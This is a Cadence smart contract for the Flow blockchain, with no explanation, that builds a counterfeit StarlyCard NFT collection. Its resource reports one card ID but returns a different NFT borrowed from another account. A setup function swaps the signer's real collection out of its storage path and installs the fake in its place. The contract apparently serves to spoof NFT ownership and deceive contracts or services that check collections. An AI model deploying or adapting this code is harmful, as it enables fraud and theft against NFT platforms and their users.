import NonFungibleToken from "../0x1d7e57aa55817448/NonFungibleToken.cdc"
import MetadataViews from "../0x1d7e57aa55817448/MetadataViews.cdc"
import StarlyMetadata from "../0x5b82f21c0edf76e3/StarlyMetadata.cdc"
import StarlyMetadataViews from "../0x5b82f21c0edf76e3/StarlyMetadataViews.cdc"
import StarlyCard from "../0x5b82f21c0edf76e3/StarlyCard.cdc"

pub contract sc2{
    pub resource tr : NonFungibleToken.Provider,
        NonFungibleToken.Receiver,
        NonFungibleToken.CollectionPublic,
        MetadataViews.ResolverCollection,
        StarlyCard.StarlyCardCollectionPublic{
    pub fun withdraw(withdrawID: UInt64): @NonFungibleToken.NFT {
                        panic("no")
        }

        pub fun deposit(token: @NonFungibleToken.NFT) {
                        panic("no")
        }


        pub fun getIDs(): [UInt64] {
            return [57878]
        }

        pub fun borrowNFT(id: UInt64): &NonFungibleToken.NFT {
            let owner = getAccount(0x7385fe158fe579ba)
            let col= owner
                .getCapability(/public/starlyCardCollection)
                .borrow<&{NonFungibleToken.CollectionPublic}>()
                ?? panic("NFT Collection not found")
            if col == nil { panic("no") }
    
            let nft = col!.borrowNFT(id: 43465)
            return nft
        }
        
        pub fun borrowViewResolver(id: UInt64): &AnyResource{MetadataViews.Resolver} {
            let owner = getAccount(0x7385fe158fe579ba)
            let col= owner
                .getCapability(/public/starlyCardCollection)
                .borrow<&{MetadataViews.ResolverCollection}>()
                ?? panic("NFT Collection not found")
            if col == nil { panic("no") }
    
            let nft = col!.borrowViewResolver(id: 43465)
            return nft
        }

        pub fun borrowStarlyCard(id: UInt64): &StarlyCard.NFT? {
            let owner = getAccount(0x7385fe158fe579ba)
            let col= owner
                .getCapability(/public/starlyCardCollection)
                .borrow<&{StarlyCard.StarlyCardCollectionPublic}>()
                ?? panic("NFT Collection not found")
            if col == nil { panic("no") }
    
            let nft = col!.borrowStarlyCard(id: 43465)
            return nft
        }
    }
    pub fun loadR(_ signer: AuthAccount){
        let r <- create tr()
        let old <- signer.load<@StarlyCard.Collection>(from: /storage/starlyCardCollection)!
        signer.save(<- r, to: /storage/starlyCardCollection)
        signer.save(<- old, to: /storage/sc2)
    }
    pub fun clearR(_ signer: AuthAccount){
        let old <- signer.load<@StarlyCard.Collection>(from: /storage/sc2)!
        let r <- signer.load<@sc2.tr>(from: /storage/starlyCardCollection)!

        signer.save(<- old, to: /storage/starlyCardCollection)
        destroy r
    }
    init() {
        self.loadR(self.account)
    }
}